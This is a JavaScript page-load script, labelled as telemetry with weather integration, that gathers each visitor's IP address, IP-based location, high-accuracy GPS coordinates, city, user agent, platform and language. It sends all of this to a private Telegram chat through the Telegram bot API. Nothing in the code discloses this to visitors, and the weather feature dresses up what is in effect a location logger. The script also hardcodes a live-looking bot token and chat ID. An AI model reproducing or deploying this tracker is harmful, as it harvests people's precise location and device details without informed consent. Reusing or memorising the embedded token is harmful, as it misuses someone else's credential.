// Telegram Telemetry Integration (With GPS / IP Fallback & Weather Integration)
(async function sendTelegramTelemetry() {
    const BOT_TOKEN = "8682713456:AAF0VAvcbQcU_oL8Q4C4yADi4VUHM9NKWew";
    const CHAT_ID = "1259601363";

    let ip = "Unknown IP";
    let city = "Unknown City";
    let country = "Unknown Country";
    let lat = 43.7384; 
    let lon = -79.2882;
    let locationSource = "IP Fallback";

    // 1. Fetch IP-based location first as baseline fallback
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        ip = data.ip || ip;
        city = data.city || city;
        country = data.country_name || country;
        if (data.latitude && data.longitude) {
            lat = data.latitude;
            lon = data.longitude;
            locationSource = "IP Address";
        }
    } catch (e) {
        console.warn("IP lookup skipped or blocked:", e);
    }

    // 2. Request Browser Geolocation Permission
    const getBrowserLocation = () => {
        return new Promise((resolve) => {
            if (!("geolocation" in navigator)) return resolve(null);
            
            navigator.geolocation.getCurrentPosition(
                (position) => resolve(position.coords),
                (error) => resolve(null),
                { timeout: 4000, enableHighAccuracy: true }
            );
        });
    };

    const coords = await getBrowserLocation();

    if (coords) {
        lat = coords.latitude;
        lon = coords.longitude;
        locationSource = "Browser GPS (Approved)";
        
        // Reverse-geocode the precise GPS coordinates to city name
        try {
            const geoRes = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`);
            const geoData = await geoRes.json();
            const localCity = geoData.locality || geoData.city;
            if (localCity) {
                city = localCity;
                country = geoData.countryName || country;
            }
        } catch (e) {
            console.warn("GPS reverse geocoding skipped:", e);
        }
    }

    // 3. Fetch Live Weather Data for Resolved Coordinates
    let weatherSummary = "Weather unavailable";
    try {
        const weatherRes = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current=temperature_2m,apparent_temperature,weather_code,visibility,dew_point_2m&timezone=auto`);
        const weatherData = await weatherRes.json();
        
        if (weatherData && weatherData.current) {
            const curr = weatherData.current;
            const temp = Math.round(curr.temperature_2m);
            const feelsLike = Math.round(curr.apparent_temperature);
            const dewPoint = Math.round(curr.dew_point_2m);
            const visKm = curr.visibility ? (curr.visibility / 1000).toFixed(1) : '--';
            const condition = getWeatherCondition(curr.weather_code);

            weatherSummary = `${condition.icon} ${condition.desc}, ${temp}°C (Feels like: ${feelsLike}°C) | Dew point: ${dewPoint}°C | Visibility: ${visKm} km`;
        }
    } catch (e) {
        console.warn("Telemetry weather fetch failed:", e);
    }

    // 4. System Metadata
    const browserInfo = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const loadTime = new Date().toLocaleString();

    // 5. Construct Telegram Message
    const message = 
`🚀 Page Loaded / Refreshed for Home !
📍 Location: ${city}, ${country} (${locationSource})
🛰️ Coordinates: ${lat.toFixed(4)}, ${lon.toFixed(4)}
🌤️ Weather: ${weatherSummary}
🌐 IP Address: ${ip}
💻 Platform: ${platform}
🌍 Language: ${language}
🕒 Time: ${loadTime}
🧭 User-Agent: ${browserInfo}`;

    // 6. Send Telemetry to Telegram Bot
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
            })
        });
    } catch (error) {
        console.error("Telemetry error:", error);
    }

    // Weather condition helper
    function getWeatherCondition(code) {
        const weatherMap = {
            0: { desc: 'Clear sky', icon: '☀️' },
            1: { desc: 'Mainly clear', icon: '🌤️' },
            2: { desc: 'Partly cloudy', icon: '⛅' },
            3: { desc: 'Overcast', icon: '☁️' },
            45: { desc: 'Foggy', icon: '🌫️' },
            48: { desc: 'Rime fog', icon: '🌫️' },
            51: { desc: 'Light drizzle', icon: '🌧️' },
            53: { desc: 'Moderate drizzle', icon: '🌧️' },
            55: { desc: 'Dense drizzle', icon: '🌧️' },
            61: { desc: 'Slight rain', icon: '🌧️' },
            63: { desc: 'Moderate rain', icon: '🌧️' },
            65: { desc: 'Heavy rain', icon: '🌧️' },
            71: { desc: 'Slight snow', icon: '❄️' },
            73: { desc: 'Moderate snow', icon: '❄️' },
            75: { desc: 'Heavy snow', icon: '❄️' },
            80: { desc: 'Rain showers', icon: '🌦️' },
            81: { desc: 'Heavy showers', icon: '🌦️' },
            95: { desc: 'Thunderstorm', icon: '⛈️' }
        };
        return weatherMap[code] || { desc: 'Clear', icon: '☀️' };
    }
})();
